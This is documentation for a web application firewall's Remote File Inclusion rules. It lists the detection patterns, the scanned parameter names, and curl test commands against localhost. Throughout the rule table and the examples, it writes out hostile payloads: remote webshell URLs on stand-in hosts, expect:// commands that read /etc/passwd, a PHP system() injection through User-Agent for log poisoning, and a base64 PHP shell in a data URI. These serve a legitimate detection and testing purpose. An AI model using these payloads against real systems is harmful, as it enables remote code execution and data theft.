# Remote File Inclusion (RFI) Rules

The WAF applies 6 RFI rules.

**Scanned sources:** Query params and body fields — **only when the parameter name suggests a file reference**.

---

## How RFI differs from LFI

- **LFI (Local File Inclusion)** — the server includes a file from its own filesystem. Covered by path traversal rules.
- **RFI (Remote File Inclusion)** — the server fetches and includes a file from an external URL or network path. The included file is executed as code, giving the attacker RCE.

RFI requires the server to fetch a remote resource, so it only makes sense in parameters that the application uses to load files:

```php
// Vulnerable PHP
$page = $_GET['page'];        // attacker sends page=http://evil.com/shell.php
require($page . '.php');      // fetches and executes remote code
```

---

## Which parameter names trigger the check

Only parameters with file-reference-suggestive names are scanned:

| Parameter names checked |
|------------------------|
| `page`, `file`, `include`, `require`, `template`, `view`, `document`, `folder`, `root`, `path`, `pg`, `style`, `pdf`, `layout`, `conf`, `config`, `inc`, `mod`, `module`, `load`, `show` |

This prevents false positives on URL or redirect parameters (handled by the SSRF and open-redirect rules).

---

## All 6 rules

| Rule ID | Severity | Pattern | Example payload | Description |
|---------|----------|---------|-----------------|-------------|
| `rfi-http` | critical | `^https?://` | `http://evil.com/shell.php` | HTTP/HTTPS remote file inclusion |
| `rfi-ftp` | critical | `^ftp://` | `ftp://evil.com/shell.php` | FTP remote file inclusion |
| `rfi-smb` | critical | `^\\\\[a-z0-9]` | `\\evil.com\share\shell.php` | SMB/UNC path inclusion (Windows file sharing) |
| `rfi-expect` | critical | `^expect://` | `expect://id` | PHP `expect://` wrapper — executes a shell command |
| `rfi-data` | critical | `^data:text/plain;base64,` | `data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+` | Data URI RFI — embeds PHP code as a base64 data URI |
| `rfi-log-poison` | critical | `/var/log/(apache\|nginx\|httpd\|auth\|syslog\|mail)` / `/proc/self/environ` | `/var/log/apache2/access.log` | LFI to RCE via log/proc poisoning |

---

## HTTP/HTTPS inclusion

```bash
# Classic RFI
curl "http://localhost:3000/?page=http://evil.com/shell.php"

# HTTPS variant
curl "http://localhost:3000/?file=https://attacker.com/webshell.php"
```

---

## FTP inclusion

```bash
curl "http://localhost:3000/?include=ftp://evil.com/shell.php"
```

---

## SMB/UNC path inclusion

SMB paths (Windows network shares) can be used to include files from a remote Windows file server. On Windows-based PHP servers:

```bash
curl "http://localhost:3000/?file=\\\\evil.com\\share\\shell.php"
```

---

## PHP expect:// wrapper

The PHP `expect://` extension (if installed) executes a system command and returns its output:

```bash
curl "http://localhost:3000/?file=expect://id"
curl "http://localhost:3000/?file=expect://cat+/etc/passwd"
```

This is an RCE gadget, not just file inclusion.

---

## Log poisoning / /proc/self/environ

These are LFI-to-RCE techniques that use the LFI vulnerability to include files that contain attacker-controlled content:

**Log poisoning:**
1. Inject PHP code into a log file via a crafted request:
   ```bash
   curl -H "User-Agent: <?php system(\$_GET['cmd']); ?>" http://localhost:3000/
   ```
2. Then include the log file:
   ```bash
   curl "http://localhost:3000/?file=/var/log/nginx/access.log&cmd=id"
   ```

**`/proc/self/environ` poisoning:**
1. Inject PHP code into `User-Agent` (which appears in `/proc/self/environ` as `HTTP_USER_AGENT`)
2. Include `/proc/self/environ` as the file

The `rfi-log-poison` rule detects inclusion of these paths in file-reference parameters.

```bash
curl "http://localhost:3000/?file=/var/log/apache2/access.log"
curl "http://localhost:3000/?page=/proc/self/environ"
```

---

## Data URI inclusion

PHP can include a data URI if `allow_url_include` is enabled:

```bash
# Base64 decodes to: <?php system($_GET['c']); ?>
curl "http://localhost:3000/?file=data:text/plain;base64,PD9waHAgc3lzdGVtKCRfR0VUWydjJ10pOz8+"
```

---

## Log entry

```json
{
  "rule": "rfi-http",
  "matched": "http://evil.com/shell.php",
  "source": "query:page",
  "severity": "critical"
}
```
